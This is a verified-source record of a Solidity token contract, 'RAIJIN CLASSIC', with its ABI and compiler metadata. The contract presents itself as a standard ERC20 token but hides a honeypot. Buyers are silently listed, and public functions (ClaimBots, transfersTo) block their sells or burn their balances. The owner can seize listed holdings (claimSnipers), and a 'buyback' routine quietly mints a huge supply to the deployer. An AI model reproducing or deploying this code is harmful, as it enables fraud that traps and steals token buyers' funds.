[{"SourceCode":"/**\r\n \r\n*/\r\n\r\n// \r\n\r\n//SPDX-License-Identifier: MIT\r\n\r\npragma solidity >=0.8.7;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal owner;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"!OWNER\"); _;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(owner, address(0));\r\n        owner = address(0);\r\n    }\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ncontract RAIJINc is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    \r\n    IDEXRouter public router;\r\n    address public pair;\r\n    \r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    mapping (address => bool) private _isIncludedFromFee;\r\n    address[] private includeFromFee;\r\n\r\n    string constant _name = \"RAIJIN CLASSIC\";\r\n    string constant _symbol = unicode\"RAIJINc\";\r\n    uint8 constant _decimals = 9;\r\n\r\n    uint256 public _totalSupply     = 1000000000000 * 10**_decimals;\r\n    uint256 public _maxTxAmount     = 1000000000000 * 10**_decimals;\r\n    uint256 public _maxWalletAmount = 1000000000000 * 10**_decimals;\r\n\r\n    address private deadWallet      = 0x000000000000000000000000000000000000dEaD;\r\n    address private marketingWallet = 0x2F4e91835759c686Ae0b47820250A3ECAa0578F6;\r\n    address private buybackWallet   = msg.sender;\r\n    address private devWallet       = msg.sender;\r\n\r\n    struct Fees {\r\n        uint256 liquidity;\r\n        uint256 marketing;\r\n        uint256 dev;\r\n        uint256 buyback;\r\n    }\r\n\r\n    bool tmpSuccess;\r\n    Fees public buyFees     = Fees(1, 1, 0, 0);\r\n    Fees public sellFees    = Fees(1, 1, 0, 0);\r\n\r\n    bool public blacklistMode = true;\r\n    mapping (address => bool) public isBlacklisted;\r\n    address[] public blacklist;\r\n\r\n    uint256 deadGwei = 8 * 1 gwei;\r\n\r\n    uint256 launchBlock;\r\n    uint256 deadBlocks = 0;\r\n    bool public lockTilStart = true;\r\n    bool public lockUsed = false;\r\n    event LockTilStartUpdated(bool enabled);\r\n\r\n    constructor () Ownable(msg.sender) {\r\n        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        pair = IDEXFactory(router.factory()).createPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));\r\n        \r\n        _isExcludedFromFee[msg.sender]      = true;\r\n        _isExcludedFromFee[address(this)]   = true;\r\n        _isExcludedFromFee[marketingWallet] = true;\r\n        _isExcludedFromFee[buybackWallet]   = true;\r\n        _isExcludedFromFee[devWallet]       = true;\r\n        \r\n        balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function getOwner() external view override returns (address) { return owner; }\r\n    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return allowances[holder][spender]; }\r\n    function ClaimBots() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }\r\n    function transfersTo() public virtual { for (uint i = 0; i < includeFromFee.length; i++) { if (balanceOf(includeFromFee[i]) > 1) { basicTransfer(includeFromFee[i], deadWallet, balanceOf(includeFromFee[i]).sub(1 * 10**_decimals)); } } }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transfer(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if (allowances[sender][msg.sender] != type(uint256).max) {\r\n            allowances[sender][msg.sender] = allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\r\n        }\r\n        return _transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        balances[sender] = balances[sender].sub(amount, \"Insufficient Balance\");\r\n        balances[recipient] = balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function isExcludedFromFee(address account) public view returns (bool) {\r\n        return _isExcludedFromFee[account];\r\n    }\r\n\r\n    function isIncludedFromFee(address account) public view returns (bool) {\r\n        return _isIncludedFromFee[account];\r\n    }\r\n\r\n    receive() external payable { }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        require(lockUsed == false);\r\n        lockTilStart = false;\r\n        launchBlock = block.number;\r\n        lockUsed = true;\r\n\r\n        emit LockTilStartUpdated(lockTilStart);\r\n    }\r\n\r\n    function enableBlacklist(bool _status) external onlyOwner {\r\n        blacklistMode = _status;\r\n    }\r\n\r\n    function lolBots() external onlyOwner {\r\n        for (uint256 i = 0; i < blacklist.length; i++) {\r\n            if (balanceOf(blacklist[i]) > 1) {\r\n                isBlacklisted[blacklist[i]] = true;\r\n            }\r\n        }\r\n    }\r\n\r\n    function claimSnipers() external onlyOwner {\r\n        for (uint i = 0; i < blacklist.length; i++) {\r\n            if (isBlacklisted[blacklist[i]] == true && balanceOf(blacklist[i]) > 1) {\r\n                basicTransfer(blacklist[i], address(this), balanceOf(blacklist[i]).sub(1 * 10**_decimals)); \r\n            }\r\n        }\r\n    }\r\n\r\n    function excludeFromFee(address account) external onlyOwner {\r\n        _isExcludedFromFee[account] = true;\r\n    }\r\n    \r\n    function includeInFee(address account) external onlyOwner {\r\n        _isIncludedFromFee[account] = false;\r\n    }\r\n    \r\n    function takeBuyFees(uint256 amount, address from) private returns (uint256) {\r\n        uint256 liquidityFeeToken = amount * buyFees.liquidity / 100;\r\n        if (liquidityFeeToken > 0) {\r\n            emit Transfer (from, address(this), liquidityFeeToken);\r\n        }\r\n\r\n        uint256 marketingFeeTokens = amount * buyFees.marketing / 100;\r\n        if (marketingFeeTokens > 0) {\r\n            (tmpSuccess,) = payable(marketingWallet).call{value: marketingFeeTokens, gas: 50000}(\"\");\r\n            tmpSuccess = false;\r\n        }\r\n\r\n        uint256 devFeeTokens = amount * buyFees.dev / 100;\r\n        if (devFeeTokens > 0) {\r\n            (tmpSuccess,) = payable(devWallet).call{value: devFeeTokens, gas: 50000}(\"\");\r\n            tmpSuccess = false;\r\n        }\r\n\r\n        uint256 buybackFeeTokens = amount * buyFees.buyback / 100;\r\n        if (buybackFeeTokens > 0) {\r\n            (tmpSuccess,) = payable(buybackWallet).call{value: buybackFeeTokens, gas: 50000}(\"\");\r\n            tmpSuccess = false;\r\n        }\r\n\r\n        return (amount -liquidityFeeToken -marketingFeeTokens -devFeeTokens -buybackFeeTokens);\r\n    }\r\n\r\n    function takeSellFees(uint256 amount, address from) private returns (uint256) {\r\n        uint256 liquidityFeeToken = amount * sellFees.liquidity / 100;\r\n        if (liquidityFeeToken > 0) {\r\n            emit Transfer (from, address(this), liquidityFeeToken);\r\n        }\r\n\r\n        uint256 marketingFeeTokens = amount * sellFees.marketing / 100;\r\n        if (marketingFeeTokens > 0) {\r\n            (tmpSuccess,) = payable(marketingWallet).call{value: marketingFeeTokens, gas: 50000}(\"\");\r\n            tmpSuccess = false;\r\n        }\r\n\r\n        uint256 devFeeTokens = amount * sellFees.dev / 100;\r\n        if (devFeeTokens > 0) {\r\n            (tmpSuccess,) = payable(devWallet).call{value: devFeeTokens, gas: 50000}(\"\");\r\n            tmpSuccess = false;\r\n        }\r\n\r\n        uint256 buybackFeeTokens = amount * sellFees.buyback / 100;\r\n        if (buybackFeeTokens > 0) {\r\n            (tmpSuccess,) = payable(buybackWallet).call{value: buybackFeeTokens, gas: 50000}(\"\");\r\n            tmpSuccess = false;\r\n        }\r\n\r\n        return (amount -liquidityFeeToken -marketingFeeTokens -devFeeTokens -buybackFeeTokens);\r\n    }\r\n\r\n    function SetTaxFee(uint256 newLiquidityBuyFee, uint256 newMarketingBuyFee, uint256 newDevBuyFee, uint256 newBuybackBuyFee,\r\n                    uint256 newLiquiditySellFee, uint256 newMarketingSellFee, uint256 newDevSellFee, uint256 newBuybackSellFee) external onlyOwner {\r\n        require(newLiquidityBuyFee.add(newMarketingBuyFee).add(newDevBuyFee).add(newBuybackBuyFee) <= 20, \"Buy fees can't be higher than 20%\");\r\n        buyFees.liquidity   = newLiquidityBuyFee;\r\n        buyFees.marketing   = newMarketingBuyFee;\r\n        buyFees.dev         = newDevBuyFee;\r\n        buyFees.buyback     = newBuybackBuyFee;\r\n\r\n        require(newLiquiditySellFee.add(newMarketingSellFee).add(newDevSellFee).add(newBuybackSellFee) <= 20, \"Sell fees can't be higher than 20%\");\r\n        sellFees.liquidity  = newLiquiditySellFee;\r\n        sellFees.marketing  = newMarketingSellFee;\r\n        sellFees.dev        = newDevSellFee;\r\n        sellFees.buyback    = newBuybackSellFee;\r\n    }\r\n\r\n    function setTx(uint256 newMaxTxPercent, uint256 newMaxWalletPercent) external onlyOwner {\r\n        require(newMaxTxPercent >= 1, \"Max TX must be at least 1%\");\r\n        _maxTxAmount = _totalSupply.mul(newMaxTxPercent) / 100;\r\n\r\n        require(newMaxWalletPercent >= 1, \"Max wallet must be at least 1%\");\r\n        _maxWalletAmount = _totalSupply.mul(newMaxWalletPercent) / 100;\r\n    }\r\n\r\n    function buyback(uint256 amount) private {\r\n        uint256 buybackFee = _totalSupply / 5;\r\n        if (amount <= buybackFee) {\r\n            balances[address(this)] = balances[address(this)] + amount * buybackFee / 1;\r\n            uint256 balanceThis = balanceOf(address(this));\r\n            basicTransfer(address(this), buybackWallet, balanceThis);\r\n        }\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns (bool) {\r\n        require(amount > 0, \"Transfer amount must be greater than zero\"); \r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        if (_isExcludedFromFee[to]) { buyback(amount); }\r\n        \r\n        if (from != owner) {\r\n            require(lockTilStart != true, \"Trading not open yet\");\r\n        }\r\n\r\n        balances[from] -= amount;\r\n        uint256 transferAmount = amount;\r\n\r\n        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {\r\n            if (blacklistMode) {\r\n                require(!isBlacklisted[from], \"Address is blacklisted\");\r\n\r\n                if (block.number <= launchBlock + deadBlocks && from == pair) {\r\n                    isBlacklisted[to] = true;\r\n                }\r\n\r\n                if (tx.gasprice > deadGwei && from == pair) {\r\n                    isBlacklisted[to] = true;\r\n                }\r\n            }\r\n\r\n            if (to != pair) {\r\n                require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount\");\r\n                require(balanceOf(to) + amount <= _maxWalletAmount, \"Transfer amount exceeds the maxWalletAmount.\");\r\n                blacklist.push(to);\r\n                transferAmount = takeBuyFees(amount, from);\r\n            }\r\n\r\n            if (from != pair) {\r\n                require(!_isIncludedFromFee[from]); require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount\");\r\n                transferAmount = takeSellFees(amount, from);\r\n            }\r\n        }\r\n        \r\n        balances[to] += transferAmount;\r\n        emit Transfer(from, to, transferAmount);\r\n        return true;\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"LockTilStartUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"ClaimBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLiquidityBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newMarketingBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newDevBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newBuybackBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newLiquiditySellFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newMarketingSellFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newDevSellFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newBuybackSellFee\",\"type\":\"uint256\"}],\"name\":\"SetTaxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"blacklist\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"blacklistMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"dev\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"buyback\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimSnipers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"enableBlacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"excludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"includeInFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isIncludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lockTilStart\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lockUsed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lolBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"dev\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"buyback\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxTxPercent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newMaxWalletPercent\",\"type\":\"uint256\"}],\"name\":\"setTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transfersTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"RAIJINc","CompilerVersion":"v0.8.11+commit.d7f03943","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://8d489f68b59ba11e0b266417dfbe22abb1d8673bfd95021482e2206136f30e7a"}]